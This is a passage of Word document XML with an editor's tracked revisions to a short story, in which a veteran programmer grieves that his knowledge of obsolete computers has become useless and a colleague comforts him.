            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> B</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="763" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidR="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>b</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y Sun Microsystems</w:t>
      </w:r>
      <w:del w:id="764" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="765" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidR="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="766" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> B</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="767" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidR="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>b</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y Amiga</w:t>
      </w:r>
      <w:del w:id="768" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="769" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidR="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="770" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="771" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidR="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>b</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="772" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>B</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y Tandy.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felt dizzy. It was all, as he said, ancient</w:t>
      </w:r>
      <w:ins w:id="773" w:author="TextVet" w:date="2016-03-16T14:43:00Z">
        <w:r w:rsidR="006A7E46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="774" w:author="TextVet" w:date="2016-03-16T14:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006A7E46">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775" w:author="TextVet" w:date="2016-03-16T14:43:00Z">
        <w:r w:rsidR="006A7E46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>y</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="776" w:author="TextVet" w:date="2016-03-16T14:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006A7E46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Y</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>et so familiar</w:t>
      </w:r>
      <w:ins w:id="777" w:author="TextVet" w:date="2016-03-16T14:43:00Z">
        <w:r w:rsidR="006A7E46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="778" w:author="TextVet" w:date="2016-03-16T14:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006A7E46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. S</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="779" w:author="TextVet" w:date="2016-03-16T14:43:00Z">
        <w:r w:rsidR="006A7E46">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 xml:space="preserve">o painfully, intimately </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="780" w:author="TextVet" w:date="2016-03-16T14:44:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>familiar</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first program Danny ever wrote was a BASIC script on a brand-new, cutting-edge Tandy TRS-80 that his dad brought home from Radio Shack and hooked to their big, knobby family TV. The program filled the rounded glass screen with “DANNY”, scrolling in an endless loop. He wrote it all by himself. He was seven years old.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Tandy went defunct in 2000.</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job in college was porting the University’s data entry systems from a DEC PDP-11 to IBM’s OS/2. He laughed at the primitive design of the original software — until he realized that the engineer who had built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system had, in turn, ported it from something even older. Danny knew everything back then. There was no technical challenge that wouldn’t crumble under the might of his intellect. He was eighteen years old.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IBM discontinued OS/2 in 2001.</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His master’s thesis was on transistor placement to optimize thermal dissipation in 3D VLSI layout. His research was funded by Cray Computer Corporation, as part of the company’s efforts to keep supercomputer architectures competitive against new </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>“massively parallel” systems. He even had the profound honor of attending a dinner with the legendary Seymour Cray himself once, when he was twenty-two years old.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Jason said softly.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Danny croaked out, his voice scraping over a lump in his throat.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Seymour Cray died in a car accident the following year. Cray Computer Corporation went bankrupt in 1995. A boom in massive parallelization technology rendered the supercomputer obsolete.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slammed his laptop shut.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are you okay?”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“Yeah, I’m f—,” Danny began to say, but felt his voice crack. He blinked away the moisture in his eyes. “I’m fine!” He jumped </w:t>
      </w:r>
      <w:ins w:id="781" w:author="TextVet" w:date="2016-03-16T14:46:00Z">
        <w:r w:rsidR="00E34148">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="782" w:author="TextVet" w:date="2016-03-16T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E34148">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>out of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the car, slamming the door</w:t>
      </w:r>
      <w:del w:id="783" w:author="TextVet" w:date="2016-03-16T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F4576">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> behind him</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="784" w:author="TextVet" w:date="2016-03-16T14:46:00Z">
        <w:r w:rsidR="00B634E1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="785" w:author="TextVet" w:date="2016-03-16T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B634E1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. He</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sat down on the pavement against the tire, set his laptop down by his feet, and buried his face in his hands.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exited the SUV and came around. “You alright?” he asked, sitting down beside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sighed. He poked at his laptop with his foot. “I hate these things.”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“Laptops?”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“Computers. Cellphones. Kindles. iPods. iPads. Androids. I fucking hate it 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“What’s going on with you, Danny?” Jason’s tone was professional but kind.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“Six years at one dead company. Six years at another. And another…” Danny stared away emptily. “The tech industry is such a goddamned waste of life. Everything I’ve ever built just gets swept away by the next great wave. My resume reads like the dot-com obituaries. They all start out as brilliant ideas and then become obsolete in the time it takes to put those ideas into action.”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thought for a few moments. “You remember what I said,</w:t>
      </w:r>
      <w:del w:id="786" w:author="TextVet" w:date="2016-03-16T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003C112F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> Danny,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> when I saw you holding that invention of yours back at the club? You love your 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 Jason. And do you know how much it hurts to love something that dies so quickly? You learn some amazing complex system, and then</w:t>
      </w:r>
      <w:ins w:id="787" w:author="TextVet" w:date="2016-03-16T14:49:00Z">
        <w:r w:rsidR="003633E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="788" w:author="TextVet" w:date="2016-03-16T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003633E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="789" w:author="TextVet" w:date="2016-03-16T14:49:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>bam!</w:t>
      </w:r>
      <w:ins w:id="790" w:author="TextVet" w:date="2016-03-16T14:49:00Z">
        <w:r w:rsidR="003633E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
        <w:r w:rsidR="003633E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="791" w:author="TextVet" w:date="2016-03-16T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003633E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> O</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">bsolete overnight. I can rattle off every opcode in the Motorola 68K instruction set. I know the full pin-out structure for the Intel 80286 CPU. I know a thousand things that, at their </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>time, were cutting-edge. I was fucking awesome. And now? Now they’re dust. And all that shit is still in my head, like the abandoned ruins of some ancient civilization. All that skill, that hard-won knowledge… it’s useless. Useless.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="005E5E7F" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="792" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Now</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="793" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E5E7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Jason</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> st</w:t>
      </w:r>
      <w:ins w:id="794" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>an</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="795" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E5E7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>oo</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:ins w:id="796" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="797" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E5E7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> up</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> beside him</w:t>
      </w:r>
      <w:ins w:id="798" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, Jason</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="799" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E5E7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> reached </w:t>
      </w:r>
      <w:del w:id="800" w:author="TextVet" w:date="2016-03-16T14:50:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00392456">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">his hand </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>down toward Danny. “Listen. I’m not sure exactly what triggered this, but if you really take pride in your work, then… Well, you’re at work this very minute, remember? Stop sulking. You’re on the clock. You’ve got a job to do.”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breathed slowly, as though the </w:t>
      </w:r>
      <w:ins w:id="801" w:author="TextVet" w:date="2016-03-16T14:57:00Z">
        <w:r w:rsidR="0013615E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>cold</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="802" w:author="TextVet" w:date="2016-03-16T14:55:00Z">
        <w:r w:rsidR="00D4155B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> air could quell the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">broth of self-pity </w:t>
      </w:r>
      <w:del w:id="803" w:author="TextVet" w:date="2016-03-16T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E010F3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>boil</w:t>
      </w:r>
      <w:ins w:id="804" w:author="TextVet" w:date="2016-03-16T14:51:00Z">
        <w:r w:rsidR="00E010F3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="805" w:author="TextVet" w:date="2016-03-16T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E010F3">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in his gut</w:t>
      </w:r>
      <w:del w:id="806" w:author="TextVet" w:date="2016-03-16T14:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D4155B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> could be chilled by drinking</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="807" w:author="TextVet" w:date="2016-03-16T14:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E010F3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in th</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="808" w:author="TextVet" w:date="2016-03-16T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E010F3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e</w:delText>
        </w:r>
      </w:del>
